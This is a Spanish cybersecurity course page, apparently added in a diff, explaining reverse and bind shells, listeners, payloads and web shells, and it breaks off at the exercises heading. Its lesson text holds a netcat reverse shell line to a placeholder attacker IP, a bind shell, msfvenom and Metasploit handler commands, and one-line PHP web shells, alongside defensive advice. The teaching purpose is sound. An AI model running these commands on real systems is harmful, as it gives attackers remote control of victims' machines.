@@ -1,0 +1,1150 @@
+
+<!doctype html>
+<html lang="es" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+        <meta name="description" content="Explicación teórica reverse shell, bind shell, paylods, webshells. Apuntes, teoría, prácticas, ejercicio del curso de especialización de ciberseguridad. IES severo ochoa Elche. Hacking ético. incidentes de seguridad, puesta en producción segura.">
+      
+      
+      
+        <link rel="canonical" href="https://jogonar-rgb.github.io/Ciberseguridad_25_26/Seguridad_ofensiva/rev_shell/">
+      
+      
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.20">
+    
+    
+      
+        <title>Una revisión de las shells - Seguridad en sistemas del curso de especialista en ciberseguridad</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.e53b48f4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="light-green" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#que-es-una-shell" class="md-skip">
+          Saltar a contenido
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Cabecera">
+    <a href="../.." title="Seguridad en sistemas del curso de especialista en ciberseguridad" class="md-header__button md-logo" aria-label="Seguridad en sistemas del curso de especialista en ciberseguridad" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Seguridad en sistemas del curso de especialista en ciberseguridad
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Una revisión de las shells
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="light-green" data-md-color-accent="indigo"  aria-label="Cambiar a modo oscuro"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Cambiar a modo oscuro" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="teal" data-md-color-accent="indigo"  aria-label="Cambiar a modo normal"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Cambiar a modo normal" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Búsqueda" placeholder="Búsqueda" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Buscar">
+        
+        <button type="reset" class="md-search__icon md-icon" title="Limpiar" aria-label="Limpiar" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Inicializando búsqueda
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="Pestañas" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../.." class="md-tabs__link">
+        
+  
+  
+    
+  
+  Introducción
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../warm/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Warm up
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../" class="md-tabs__link">
+          
+  
+  
+    
+  
+  Seguridad ofensiva
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+  
+
+<nav class="md-nav md-nav--primary md-nav--lifted md-nav--integrated" aria-label="Navegación" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Seguridad en sistemas del curso de especialista en ciberseguridad" class="md-nav__button md-logo" aria-label="Seguridad en sistemas del curso de especialista en ciberseguridad" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Seguridad en sistemas del curso de especialista en ciberseguridad
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introducción
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../warm/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    Warm up
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_2" id="__nav_2_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            Warm up
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../warm/Apuntes_Linux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Entornos Linux
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../warm/Ejercicios_Linux/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Ejercicios propuestos Linux
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../warm/Apuntes_Windows/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Entornos Windows
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../warm/Ejercicios_Windows/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Ejercicios propuestos Windows
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../warm/webgrafia/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Webgrafía
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_3" >
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    Seguridad ofensiva
+    
+  </span>
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            Seguridad ofensiva
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Intro/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introducción
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../nmap101/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Introducción a Nmap
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../enumeracion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Enumeración de servicios
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../servicios_desact/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Causas de vulnerabilidades en sistemas
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../exploit/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Explotación de vulnerabilidades
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../metasploit/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Metasploit
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../privesc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Escalada de privilegios
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ad_enumeration/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Enumeración en entornos AD (Active Directory)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../passw_manag/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Gestión y almacenamiento de credenciales en Windows
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../phising/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Spoofing & phising
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../HackingAD1/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Ataques en entornos Active Directory
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../webgrafia/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Webgrafía
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+  <h1>Una revisión de las shells</h1>
+
+<h2 id="que-es-una-shell">¿Qué es una shell?</h2>
+<p>Una shell es un software que permite al usuario interactuar con un sistema operativo, normalmente es una interfaz de línea de comandos.</p>
+<p>En ciberseguridad, nos referimos comúnmente a una sesión shell específica que un atacante utiliza cuando accede a un sistema comprometido, permitiéndole ejecutar diferentes comandos. Esto permitirá llevar a cabo varias actividades, algunas de las cuales se describen a continuación.</p>
+<ul>
+<li><strong>Control remoto del sistema</strong>: permite al atacante ejecutar comandos o software de forma remota en el sistema objetivo.</li>
+<li><strong>Escalada de privilegios</strong>: Si el acceso inicial a través de una shell está limitado o restringido, los atacantes pueden explorar formas de escalar privilegios a accesos más elevados o administrativos.</li>
+<li><strong>Exfiltración de datos</strong>: Una vez que los atacantes tienen acceso para ejecutar comandos a través de un shell obtenido, pueden explorar el sistema para leer y copiar datos sensibles del mismo.</li>
+<li><strong>Persistencia y Acceso de Mantenimiento</strong>: Una vez obtenido el acceso al shell, los atacantes pueden crear accesos a través de usuarios y credenciales o copiar software de puerta trasera para mantener el acceso al sistema objetivo para su uso posterior.</li>
+<li><strong>Actividades posteriores a la explotación</strong>: Una vez concedido el acceso a un shell, los atacantes pueden realizar una amplia gama de actividades posteriores a la explotación, como desplegar malware, crear cuentas ocultas y eliminar información.</li>
+<li><strong>Acceder a otros sistemas de la red</strong>: Dependiendo de las intenciones del atacante, el shell obtenido puede ser sólo un punto de acceso inicial. El objetivo puede ser saltar a través de la red hacia un objetivo diferente utilizando la shell obtenida como pivote hacia diferentes puntos de la red del sistema comprometido. Esto también se conoce como pivoting o movimiento lateral.</li>
+</ul>
+<h2 id="tipos-de-shell">Tipos de shell</h2>
+<h3 id="reverse-shell">Reverse shell</h3>
+<ul>
+<li>
+<p><u>Definición:</u> Un reverse shell es un tipo de acceso remoto donde la <strong>máquina objetivo (víctima)</strong> inicia una conexión saliente a la <strong>máquina del atacante</strong>. Esta conexión permite al atacante acceder a la línea de comandos de la máquina objetivo.</p>
+</li>
+<li>
+<p><u>Cómo funciona:</u> En una configuración de shell inversa, el atacante configura un <strong>listener</strong> en un puerto específico. Una vez que la carga se ejecuta en la máquina de destino, se conecta de nuevo a la máquina del atacante, creando una <strong>interfaz de línea de comandos</strong> a través de la red.</p>
+</li>
+<li>
+<p><u><strong>Por qué usar Reverse Shells</strong>:</u> Los shells inversos se utilizan a menudo para eludir cortafuegos y configuraciones NAT (Network Address Translation), que normalmente bloquean las conexiones entrantes pero permiten las salientes. Al iniciar una conexión saliente desde el objetivo, los shells inversos aprovechan esta apertura en el cortafuegos.</p>
+</li>
+</ul>
+<p><strong><u>Ejemplo</strong></u></p>
+<p>Netcat es una herramienta que soporta múltiples sistemas oprativos, permite lecturas y escrituras a través de la red. </p>
+<p>El atacante utiliza Netcat para escuchar en el puerto 4444:</p>
+<div class="highlight"><pre><span></span><code>nc<span class="w"> </span>-lvp<span class="w"> </span><span class="m">4444</span>
+</code></pre></div>
+<p>A continuación, el objetivo o víctima ejecuta un <em>payload</em> para conectarse de nuevo a la máquina del atacante:
+<div class="highlight"><pre><span></span><code>nc<span class="w"> </span><span class="o">[</span>atacante_IP<span class="o">]</span><span class="w"> </span><span class="m">4444</span><span class="w"> </span>-e<span class="w"> </span>/bin/bash
+</code></pre></div></p>
+<p>Esta configuración permite al atacante controlar el intérprete de comandos de la víctima a través de la red.</p>
+<hr />
+<h3 id="bind-shell">Bind shell</h3>
+<ul>
+<li>
+<p><u>Definición:</u> En una bind shell, la máquina objetivo escucha en un puerto específico, esperando una conexión entrante del atacante. Una vez que el atacante se conecta, obtiene acceso remoto a la línea de comandos.</p>
+</li>
+<li>
+<p><u>Cómo funciona:</u> Con una bind shell la <strong>máquina objetivo se convierte en el oyente</strong> y abre un puerto de red, vinculando un shell a ese puerto. El atacante se conecta a este puerto abierto para obtener acceso.</p>
+</li>
+<li>
+<p><u>Limitaciones de Bind Shells:</u> Los Bind Shells son más difíciles de usar en entornos con cortafuegos restrictivos o NAT porque requieren que la máquina de destino acepte conexiones entrantes en un puerto específico.</p>
+</li>
+</ul>
+<p><strong><u>Ejemplo</strong></u></p>
+<p>La máquina destino utiliza Netcat para configurar un bind shell:</p>
+<p><div class="highlight"><pre><span></span><code>nc<span class="w"> </span>-lvp<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-e<span class="w"> </span>/bin/bash
+</code></pre></div>
+A continuación, el atacante se conecta a la IP y al puerto de la máquina objetivo:
+<div class="highlight"><pre><span></span><code>nc<span class="w"> </span><span class="o">[</span>IP_objetivo<span class="o">]</span><span class="w"> </span><span class="m">4444</span>
+</code></pre></div></p>
+<hr />
+<p><strong>Reverse shells VS Bind shells</strong></p>
+<ul>
+<li>Las <strong>Reverse Shells</strong> se prefieren en entornos seguros porque inician conexiones salientes, a menudo permitidas por cortafuegos.</li>
+<li>Las <strong>Bind Shells</strong> requieren un puerto de entrada abierto, que a menudo es bloqueado por los cortafuegos, haciéndolos más difíciles de ejecutar en las redes modernas.</li>
+</ul>
+<h3 id="listeners"><strong>Listeners</strong></h3>
+<ul>
+<li>
+<p><u>Definición:</u> Un listener es un proceso configurado por el atacante para esperar una conexión entrante desde una máquina objetivo. El listener es crítico para establecer tanto reverse como bind shells.</p>
+</li>
+<li>
+<p><u>Propósito:</u> El listener actúa como receptor, esperando a que la máquina objetivo inicie una conexión (en reverse shells) o se conecte a un puerto abierto del objetivo (en bind shells).</p>
+</li>
+</ul>
+<h4 id="herramientas-comunes"><u><strong>Herramientas comunes</strong></u></h4>
+<ul>
+<li>
+<p><strong>Netcat (nc):</strong> Una de las herramientas más sencillas y utilizadas para configurar escuchas.</p>
+</li>
+<li>
+<p><strong>Metasploit Multi/Handler</strong>: La herramienta <code>multi/handler</code> de Metasploit está diseñada para gestionar listeners para varios tipos de payloads, incluyendo reverse shells, proporcionando flexibilidad y características más allá de lo que ofrece Netcat.</p>
+</li>
+</ul>
+<p><strong>Ejemplo de listener de Netcat</strong>:
+<div class="highlight"><pre><span></span><code>nc<span class="w"> </span>-lvp<span class="w"> </span><span class="m">4444</span><span class="w"> </span><span class="c1"># escucha en el puerto 4444 cualquier conexión entrante</span>
+</code></pre></div></p>
+<hr />
+<h3 id="payloads"><strong>Payloads</strong></h3>
+<ul>
+<li><u>Definición:</u> Un payload es una pieza de código que se ejecuta en la máquina objetivo para establecer una conexión de vuelta al atacante o abrir un puerto para que el atacante se conecte. La carga útil puede iniciar un shell inverso o bind y puede variar en función del sistema operativo de destino, el tipo de shell o las necesidades de evasión.</li>
+</ul>
+<h4 id="tipos-de-payloads">Tipos de payloads</h4>
+<ul>
+<li><strong>Payload de shell inversa:</strong> Diseñado para iniciar una conexión saliente desde la máquina objetivo de vuelta al atacante.</li>
+<li><strong>Payload para bind shell:</strong> Configurar un oyente en el objetivo para que el atacante se conecte.</li>
+<li><strong>Payloads en scripts:</strong> Los payloads personalizadas también pueden escribirse en lenguajes de scripting como Bash, Python, PowerShell o incluso JavaScript, dependiendo del objetivo y del contexto del ataque.</li>
+</ul>
+<h5 id="usando-metasploit-para-payloads">Usando Metasploit para Payloads</h5>
+<p>Metasploit provee payloads pre-construidos que pueden ser usados para generar reverse o bind shells.</p>
+<p>Ejemplo de comando: <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=[attacker_IP] LPORT=4444 -f exe -o shell.exe</code>.</p>
+<hr />
+<h3 id="web-shells"><strong>Web Shells</strong></h3>
+<ul>
+<li><u>Definición:</u> Un web shell es un tipo de shell que se aloja en un servidor web, permitiendo a los atacantes interactuar con el servidor a través de una interfaz web. Normalmente se trata de un pequeño script subido al servidor para ejecutar comandos del sistema.</li>
+</ul>
+<h4 id="proposito-y-uso">Propósito y uso</h4>
+<ul>
+<li>Los atacantes utilizan web shells para obtener acceso persistente a un servidor web comprometido.</li>
+<li>Las web shells permiten a los atacantes ejecutar comandos, subir archivos y ejecutar scripts adicionales en el servidor.</li>
+</ul>
+<h4 id="lenguajes-comunes-para-web-shells">Lenguajes comunes para Web Shells</h4>
+<ul>
+<li><strong>PHP</strong>:  Esta simple shell PHP toma un parámetro <code>cmd</code> y lo ejecuta en el servidor: <code>&lt;?php system($_GET['cmd']); ?&gt;</code> -</li>
+<li><strong>ASP/ASPX</strong> (utilizado en servidores Windows).</li>
+<li><strong>JSP</strong> (Java Server Pages) para servidores basados en Java.</li>
+</ul>
+<h4 id="deteccion-y-defensa">Detección y defensa</h4>
+<ul>
+<li><strong>Vigilancia de la integridad de los archivos</strong>: Comprobación de cambios no autorizados en directorios web.</li>
+<li><strong>WAF (Web Application Firewalls)</strong>: Los WAF suelen detectar y bloquear los web shells.</li>
+<li><strong>Análisis de contenido</strong>: Escaneo de archivos en el servidor en busca de patrones comunes de web shell o código sospechoso.</li>
+</ul>
+<hr />
+<h3 id="resumen-de-escenarios-de-ejemplo">Resumen de escenarios de ejemplo</h3>
+<ol>
+<li>
+<p><strong>Shell inversa con Netcat</strong>:</p>
+<ul>
+<li>
+<p><strong>Atacante (Listener)</strong>:
+   <div class="highlight"><pre><span></span><code>nc<span class="w"> </span>-lvp<span class="w"> </span><span class="m">4444</span>
+</code></pre></div>
+   La opción <strong>-l</strong> le indica a netcat que espere una conexión, <strong>-v</strong> activa la salida detallada del comando, <strong>-n</strong> impide que las conexiones hagan uso de una búsqueda DNS (no se resolverá ningún nombre, se utilizarán IPs). Finalmente la opción <strong>-p</strong> indica el puerto en el que se escuchará en espera de conexciones entrantes.</p>
+</li>
+<li>
+<p><strong>Víctima (Payload)</strong>:
+   <div class="highlight"><pre><span></span><code>nc<span class="w"> </span><span class="o">[</span>atacante_IP<span class="o">]</span><span class="w"> </span><span class="m">4444</span><span class="w"> </span>-e<span class="w"> </span>/bin/bash
+</code></pre></div></p>
+<p>Se podría utilizar cualquier puerto <em>libre</em> para escuchar.</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>Metasploit Reverse TCP Payload</strong>:</p>
+<ul>
+<li>Generar un payload:
+  <div class="highlight"><pre><span></span><code>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/meterpreter/reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=[</span>attacker_IP<span class="o">]</span><span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>reverse_shell.exe
+</code></pre></div></li>
+<li><strong>Escucha en Metasploit</strong>:
+  <div class="highlight"><pre><span></span><code>msfconsole
+use<span class="w"> </span>exploit/multi/handler
+<span class="nb">set</span><span class="w"> </span>payload<span class="w"> </span>windows/meterpreter/reverse_tcp
+<span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="o">[</span>atacante_IP<span class="o">]</span>
+<span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">4444</span>
+exploit
+</code></pre></div></li>
+</ul>
+</li>
+<li>
+<p><strong>Shell Web PHP</strong>:</p>
+<ul>
+<li>Crea una shell web PHP básica y súbela a un servidor web vulnerable.
+  <div class="highlight"><pre><span></span><code><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span>
+</code></pre></div></li>
+<li>Accede a la web shell navegando a <code>http://victima.com/shell.php?cmd=whoami</code>.</li>
+</ul>
+</li>
+</ol>
+<hr />
+<h3 id="medidas-defensivas">Medidas defensivas</h3>
+<ol>
+<li><strong>Reglas de cortafuegos</strong>: Restringir el tráfico saliente a puertos específicos para evitar que las reverse shells establezcan conexiones.</li>
+<li><strong>Sistemas de detección de intrusos</strong>: Utiliza herramientas como Suricata o Snort para detectar firmas comunes de shell y comportamientos inusuales en la red.</li>
+<li><strong>Seguridad de puntos finales</strong>: Despliegue soluciones EDR que supervisen procesos y conexiones de red anómalos.</li>
+<li><strong>Seguridad de aplicaciones web</strong>: Analice regularmente las aplicaciones web en busca de vulnerabilidades que podrían permitir a los atacantes cargar web shells.</li>
+</ol>
+<h2 id="ejercicios-propuestos">Ejercicios propuestos</h2>
+<ol>
+<li>
